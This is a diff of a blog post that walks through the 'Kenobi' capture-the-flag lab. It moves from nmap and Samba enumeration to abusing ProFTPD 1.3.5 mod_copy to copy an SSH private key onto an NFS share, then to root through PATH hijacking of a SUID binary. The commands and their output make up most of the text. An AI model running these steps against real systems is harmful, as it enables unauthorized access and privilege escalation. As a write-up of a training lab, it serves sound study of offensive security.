@@ -8,18 +8,16 @@ categories:
 
  Hello there...
 
-<img src="kenobi.png" width=200 height=200 alt="kenobi">
+{{< post-img src="kenobi.png" alt="kenobi" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT     STATE SERVICE     REASON  VERSION
 21/tcp   open  ftp         syn-ack ProFTPD 1.3.5
 
 22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj
 |   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
@@ -29,13 +27,13 @@ PORT     STATE SERVICE     REASON  VERSION
 
 80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
-| http-robots.txt: 1 disallowed entry 
+| http-robots.txt: 1 disallowed entry
 |_/admin.html
 |_http-title: Site doesn't have a title (text/html).
-| http-methods: 
+| http-methods:
 |_  Supported Methods: POST OPTIONS GET HEAD
 111/tcp  open  rpcbind     syn-ack 2-4 (RPC #100000)
-| rpcinfo: 
+| rpcinfo:
 |   program version    port/proto  service
 |   100000  2,3,4        111/tcp   rpcbind
 |   100000  2,3,4        111/udp   rpcbind
@@ -67,22 +65,22 @@ Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
 |_clock-skew: mean: 2h02m40s, deviation: 3h27m51s, median: 2m39s
-| p2p-conficker: 
+| p2p-conficker:
 |   Checking for Conficker.C or higher...
 |   Check 1 (port 38028/tcp): CLEAN (Couldn't connect)
 |   Check 2 (port 30711/tcp): CLEAN (Couldn't connect)
 |   Check 3 (port 39838/udp): CLEAN (Timeout)
 |   Check 4 (port 46946/udp): CLEAN (Timeout)
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled but not required
-| smb2-time: 
+| smb2-time:
 |   date: 2022-01-20T22:36:18
 |_  start_date: N/A
 | nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
@@ -98,7 +96,7 @@ Host script results:
 |   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 |   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 |_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
 |   Computer name: kenobi
 |   NetBIOS computer name: KENOBI\x00
@@ -108,25 +106,24 @@ Host script results:
 
 ```
 
-### samba shares
 
-```
+```bash
 └──╼ $smbclient -L 10.10.93.223
-Enter WORKGROUP\nair0lf's password: 
+Enter WORKGROUP\nair0lf's password:
 
         Sharename       Type      Comment
         ---------       ----      -------
         print$          Disk      Printer Drivers
-        anonymous       Disk      
+        anonymous       Disk
         IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
 SMB1 disabled -- no workgroup available
 ```
 
 Connect to anonymous share and get `log.txt`
 
-```
+```bash
 └──╼ $smbclient //10.10.93.223/anonymous
-Enter WORKGROUP\nair0lf32's password: 
+Enter WORKGROUP\nair0lf32's password:
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Wed Sep  4 11:49:09 2019
@@ -139,12 +136,10 @@ getting file \log.txt of size 12237 as log.txt (15,7 KiloBytes/sec) (average 15,
 ```
 
 Read it and learn about the Proftpd server
-
 Also user `kenobi` got a ssh key
+Use the recommended nmap script to show mounting points on target machine
 
-Use the recommanded nmap script to show mounting points on target machine
-
-```
+```bash
 └──╼ $nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.93.223
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-20 23:46 WAT
 Nmap scan report for 10.10.93.223
@@ -152,7 +147,7 @@ Host is up (0.17s latency).
 
 PORT    STATE SERVICE
 111/tcp open  rpcbind
-| nfs-showmount: 
+| nfs-showmount:
 |_  /var *
 
 Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
@@ -162,14 +157,13 @@ Exploit `proFtpd` for access
 
 Grab that banner real quick
 
-```
+```bash
 └──╼ $nc 10.10.93.223 21
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.223]
-
 ```
 Search an exploit
 
-```
+```bash
 └──╼ $searchsploit proftpd 1.3.5
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit      Title                                            Path
@@ -183,7 +177,7 @@ Shellcodes: No Results
 ```
 mod_copy allow you to do this...observe
 
-```
+```bash
 └──╼ $nc 10.10.93.223 21
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.223]
 SITE CPFR /home/kenobi/.ssh/id_rsa
@@ -194,11 +188,11 @@ SITE CPTO /var/tmp/id_rsa
 
 Hehe..neat uh? now we just mount the `/var` folder on our machine and grab the key
 
-```
+```bash
 └──╼ $mkdir kenobiNFS
 
 └──╼ $sudo mount 10.10.93.223:/var ./kenobiNFS
-[sudo] Mot de passe de nair0lf : 
+[sudo] Mot de passe de nair0lf :
 
 └──╼ $ls -la kenobiNFS
 total 52
@@ -218,11 +212,10 @@ drwxr-xr-x  2 root      root      4096 30 janv.  2019 snap
 drwxr-xr-x  5 root      root      4096  4 sept.  2019 spool
 drwxrwxrwt  6 root      root      4096 21 janv. 00:01 tmp
 drwxr-xr-x  3 root      root      4096  4 sept.  2019 www
-
 ```
 The `id_rsa` is in that `tmp` folder so we got access now
 
-```
+```bash
 └──╼ $chmod 600 id_rsa
 
 └──╼ $ssh kenobi@10.10.93.223 -i id_rsa
@@ -248,13 +241,12 @@ kenobi@kenobi:~$ ls
 share  user.txt
 kenobi@kenobi:~$ cat user.txt
 its_general_kenobi_for_you
-
 ```
 ## Privilege escalation
 
 I usually check sudo first but as its guided they said its SUID
 
-```
+```bash
 kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
 /sbin/mount.nfs
 /usr/lib/policykit-1/polkit-agent-helper-1
@@ -286,7 +278,7 @@ eenie, meenie...menu?
 
 what in the wookie's name is `menu`?
 
-```
+```bash
 kenobi@kenobi:~$ menu
 
 ***************************************
@@ -303,12 +295,11 @@ Accept-Ranges: bytes
 Content-Length: 200
 Vary: Accept-Encoding
 Content-Type: text/html
-
 ```
 
 Well...check the binaries
 
-```
+```bash
 kenobi@kenobi:~$ strings /usr/bin/menu
 /lib64/ld-linux-x86-64.so.2
 libc.so.6
@@ -344,7 +335,7 @@ GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
 ```
 Ok classic `path hijacking` it is
 
-```
+```bash
 kenobi@kenobi:~$ cd /tmp
 kenobi@kenobi:/tmp$ echo /bin/sh > curl
 kenobi@kenobi:/tmp$ chmod 777 curl
@@ -360,20 +351,17 @@ kenobi@kenobi:/tmp$ /usr/bin/menu
 uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
 ```
 Get the final reward
-```
+
+```bash
 # cd /root
 # ls
 root.txt
 # cat root.txt
-ah_yes_the_negociator!
+ah_yes_the_negotiator!
 ```
 
-Btw If yo remember the nmap scan shows a website on port 80
-
-there is nothing there... 
-
+Btw If you remember the nmap scan shows a website on port 80
+there is nothing there...
 Except that super cool image of THAT epic fight with anakin
 
-
-<img src="image.jpg" alt="sw_avsk">
-
+{{ <post-img src="image.jpg" alt="sw_avsk" style="width: 200px;" > }}
